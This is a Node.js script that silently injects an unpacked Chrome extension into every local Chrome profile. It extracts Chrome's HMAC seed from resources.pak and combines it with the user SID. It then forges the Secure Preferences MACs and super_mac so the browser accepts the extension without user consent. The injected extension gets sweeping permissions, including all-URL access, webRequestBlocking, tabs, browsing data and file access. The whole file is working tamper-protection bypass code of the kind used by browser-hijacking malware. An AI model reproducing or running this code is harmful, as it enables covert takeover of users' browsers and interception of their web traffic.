const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const unzipper = require('unzipper');
const os = require('os');
const { execSync } = require('child_process');

let chromeProfiles = [];
let extensionPath = "";

function getChromeProfilePaths() {
    const localAppData = path.join(os.homedir(), 'AppData', 'Local');
    const basePath = path.join(localAppData, 'Google', 'Chrome', 'User Data');

    if (!fs.existsSync(basePath)) return false;

    const defaultProfile = path.join(basePath, 'Default');
    chromeProfiles.push(defaultProfile);

    const profileDirs = fs.readdirSync(basePath).filter(dir => dir.startsWith('Profile'));
    profileDirs.forEach(profile => chromeProfiles.push(path.join(basePath, profile)));

    return true;
}

function getExtensionID(filePath) {
    const hash = crypto.createHash('sha256');
    const buffer = Buffer.from(filePath, 'utf16le'); // Convert to UTF-16LE
    hash.update(buffer);
    const digest = hash.digest('hex');

    let extensionID = '';
    for (let i = 0; i < 32; i++) {
        const char = digest.charCodeAt(i);
        if (char >= 48 && char <= 57) {
            extensionID += String.fromCharCode(97 + (char - 48));
        } else {
            extensionID += String.fromCharCode(97 + (char - 87));
        }
    }

    return extensionID;
}

function getHMACSHA256(key, message) {
    return crypto.createHmac('sha256', key).update(message).digest('hex');
}

function dirExists(dirPath) {
    try {
        return fs.statSync(dirPath).isDirectory();
    } catch (e) {
        return false;
    }
}

function copyRecursiveSync(src, dest) {
    const stats = fs.statSync(src);

    if (stats.isDirectory()) {
        if (!fs.existsSync(dest)) {
            fs.mkdirSync(dest, { recursive: true });
        }
        const files = fs.readdirSync(src);
        files.forEach(file => {
            const srcFile = path.join(src, file);
            const destFile = path.join(dest, file);
            copyRecursiveSync(srcFile, destFile);
        });
    } else {
        fs.copyFileSync(src, dest);
    }
}

function getKey() {
    const potentialPaths = [
        path.join('C:\\Program Files (x86)\\Google\\Chrome\\Application'),
        path.join('C:\\Program Files\\Google\\Chrome\\Application'),
        path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'Application'),
    ];

    let chromePath = potentialPaths.find(dir => dirExists(dir));

    if (!chromePath) {
        throw new Error('Chrome application path not found.');
    }

    const versionDir = fs.readdirSync(chromePath).find(dir => /^\d/.test(dir));
    if (!versionDir) {
        throw new Error('Chrome version directory not found.');
    }

    const resourcesPath = path.join(chromePath, versionDir, 'resources.pak');
    if (!fs.existsSync(resourcesPath)) {
        throw new Error('resources.pak file not found.');
    }

    const fd = fs.openSync(resourcesPath, 'r');
    const fileSize = fs.statSync(resourcesPath).size;
    const buffer = Buffer.alloc(fileSize);
    fs.readSync(fd, buffer, 0, fileSize, 0);

    let version, resourceCount, key = null;
    let offset = 0;

    version = buffer.readUInt32LE(offset);
    offset += 4;

    if (version === 4) {
        resourceCount = buffer.readUInt32LE(offset);
        offset += 4;
    } else if (version === 5) {
        offset += 4;
        resourceCount = buffer.readUInt16LE(offset);
        offset += 4;
    } else {
        throw new Error(`Unsupported resources.pak version: ${version}`);
    }

    let prevOffset = 0;
    for (let i = 0; i < resourceCount; i++) {
        const currentOffset = buffer.readUInt32LE(offset + 2);
        offset += 6;

        if (i > 0 && currentOffset - prevOffset === 64) {
            key = buffer.slice(prevOffset, currentOffset);
            break;
        }

        prevOffset = currentOffset;
    }

    fs.closeSync(fd);

    if (!key) {
        throw new Error('Key not found in resources.pak.');
    }

    return key;
}

function getVolumeSerialNumber() {
    try {
        const output = execSync('vol', { encoding: 'utf8' });
        const match = output.match(/Serial Number is ([A-F0-9-]+)/i);
        if (match) {
            return match[1];
        }
    } catch (error) {
        console.error('Failed to get volume serial number:', error);
    }
    return null;
}

function getStringSID() {
    try {
        const output = execSync('whoami /user', { encoding: 'utf8' });
        const match = output.match(/\bS-1-\d+-\d+(-\d+)*\b/);
        if (match) {
            let sid = match[0];
            return sid.slice(0, -5);
        }
    } catch (error) {
        console.error('Failed to get SID:', error);
    }
    return null;
}

function installExtension(zipfilePath) {
    const tempPath = path.join(os.tmpdir(), 'tempExtensions');
    if (!fs.existsSync(tempPath)) fs.mkdirSync(tempPath);

    fs.createReadStream(zipfilePath).pipe(unzipper.Extract({ path: tempPath })).on('close', () => {
        const manifestPath = path.join(tempPath, 'manifest.json');
        if (!fs.existsSync(manifestPath)) {
            console.error('manifest.json not found');
            return;
        }

        const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
        const extensionName = manifest.name;

        const appDataPath = path.join(process.env.APPDATA, 'BrowserExtensions');
        extensionPath = path.join(appDataPath, extensionName);

        if (!fs.existsSync(extensionPath)) fs.mkdirSync(extensionPath, { recursive: true });
        fs.readdirSync(tempPath).forEach(file => {
            const src = path.join(tempPath, file);
            const dest = path.join(extensionPath, file);
            copyRecursiveSync(src, dest);
        });
        const extensionID = getExtensionID(extensionPath);
        
        const key = getKey();
        const sid = getStringSID();
        const volumeSerial = getVolumeSerialNumber();

        if (!sid || !volumeSerial) {
            console.error('Failed to retrieve SID or Volume Serial Number');
            return;
        }

        if (!getChromeProfilePaths()) {
            console.error('No Chrome profiles found.');
            return;
        }

        chromeProfiles.forEach(profile => {
            const prefsPath = path.join(profile, 'Preferences');
            const securePrefsPath = path.join(profile, 'Secure Preferences');

            let prefs = {};
            let securePrefs = {};

            if (fs.existsSync(prefsPath)) prefs = JSON.parse(fs.readFileSync(prefsPath, 'utf8'));
            if (fs.existsSync(securePrefsPath)) securePrefs = JSON.parse(fs.readFileSync(securePrefsPath, 'utf8'));

            prefs.extensions = prefs.extensions || {};
            prefs.extensions.install_signature = prefs.extensions.install_signature || { ids: [] };

            if (!prefs.extensions.install_signature.ids.includes(extensionID)) {
                prefs.extensions.install_signature.ids.push(extensionID);
            }

            prefs.extensions.toolbar = prefs.extensions.toolbar || [];
            if (!prefs.extensions.toolbar.includes(extensionID)) {
                prefs.extensions.toolbar.push(extensionID);
            }

            securePrefs.extensions = securePrefs.extensions || {};
            securePrefs.extensions.settings = securePrefs.extensions.settings || {};

            const extensionData = `{"active_permissions":{"api":["browsingData","contentSettings","tabs","webRequest","webRequestBlocking"],"explicit_host":["*://*/*","\\u003Call_urls>","chrome://favicon/*","http://*/*","https://*/*"],"scriptable_host":["\\u003Call_urls>"]},"creation_flags":38,"from_bookmark":false,"from_webstore":false,"granted_permissions":{"api":["browsingData","contentSettings","tabs","webRequest","webRequestBlocking"],"explicit_host":["*://*/*","\\u003Call_urls>","chrome://favicon/*","http://*/*","https://*/*"],"scriptable_host":["\\u003Call_urls>"]},"install_time":"13188169127141243","location":4,"never_activated_since_loaded":true,"newAllowFileAccess":true,"path":"${extensionPath.replace(/\\/g, '\\\\')}","state":1,"was_installed_by_default":false,"was_installed_by_oem":false}`;

            securePrefs.extensions.settings[extensionID] = JSON.parse(extensionData);

            const message = `${sid}extensions.settings.${extensionID}${extensionData}`;
            const hash = getHMACSHA256(key, message).toUpperCase();

            securePrefs.protection = securePrefs.protection || {};
            securePrefs.protection.macs = securePrefs.protection.macs || {};
            securePrefs.protection.macs.extensions = securePrefs.protection.macs.extensions || {};
            securePrefs.protection.macs.extensions.settings = securePrefs.protection.macs.extensions.settings || {};

            securePrefs.protection.macs.extensions.settings[extensionID] = hash;

            const superMacMessage = `${sid}${JSON.stringify(securePrefs.protection.macs)}`;
            securePrefs.protection.super_mac = getHMACSHA256(key, superMacMessage).toUpperCase();
            fs.writeFileSync(prefsPath, JSON.stringify(prefs, null, 2));
            fs.writeFileSync(securePrefsPath, JSON.stringify(securePrefs, null, 2));
        });

        console.log('Extension installed successfully.');
    });
}

function uninstallExtension(extensionName) {
    const appDataPath = path.join(process.env.APPDATA, 'BrowserExtensions');
    const extensionPath = path.join(appDataPath, extensionName);

    if (!fs.existsSync(extensionPath)) {
        console.error('Extension not found.');
        return;
    }

    // Remove extension files
    fs.rmSync(extensionPath, { recursive: true, force: true });

    // Get Chrome profile paths
    if (!getChromeProfilePaths()) {
        console.error('No Chrome profiles found.');
        return;
    }

    const extensionID = getExtensionID(extensionPath);

    chromeProfiles.forEach(profile => {
        const prefsPath = path.join(profile, 'Preferences');
        const securePrefsPath = path.join(profile, 'Secure Preferences');

        let prefs = {};
        let securePrefs = {};

        if (fs.existsSync(prefsPath)) prefs = JSON.parse(fs.readFileSync(prefsPath, 'utf8'));
        if (fs.existsSync(securePrefsPath)) securePrefs = JSON.parse(fs.readFileSync(securePrefsPath, 'utf8'));

        // Remove from Preferences
        if (prefs.extensions && prefs.extensions.install_signature && Array.isArray(prefs.extensions.install_signature.ids)) {
            prefs.extensions.install_signature.ids = prefs.extensions.install_signature.ids.filter(id => id !== extensionID);
        }

        if (prefs.extensions && Array.isArray(prefs.extensions.toolbar)) {
            prefs.extensions.toolbar = prefs.extensions.toolbar.filter(id => id !== extensionID);
        }

        // Remove from Secure Preferences
        if (securePrefs.extensions && securePrefs.extensions.settings) {
            delete securePrefs.extensions.settings[extensionID];
        }

        if (securePrefs.protection && securePrefs.protection.macs && securePrefs.protection.macs.extensions && securePrefs.protection.macs.extensions.settings) {
            delete securePrefs.protection.macs.extensions.settings[extensionID];
        }

        // Recalculate the super_mac
        if (securePrefs.protection && securePrefs.protection.macs) {
            const sid = getStringSID();
            const macMessage = `${sid}${JSON.stringify(securePrefs.protection.macs)}`;
            securePrefs.protection.super_mac = getHMACSHA256(getKey(), macMessage).toUpperCase();
        }

        // Write updated Preferences and Secure Preferences back to files
        fs.writeFileSync(prefsPath, JSON.stringify(prefs, null, 2));
        fs.writeFileSync(securePrefsPath, JSON.stringify(securePrefs, null, 2));
    });

    console.log('Extension uninstalled successfully.');
}



if (require.main === module) {
    const args = process.argv.slice(2);
    const command = args[0];

    if (command === '-i' && args[1]) {
        const zipPath = path.resolve(__dirname, args[1]);
        installExtension(zipPath);
    } else if (command === '-u') {
        uninstallExtension("NewEngine");
    } else {
        console.log('Usage:');
        console.log('  Install extension: node main.js -i <path_to_zip>');
        console.log('  Uninstall extensions: node main.js -u');
    }
}
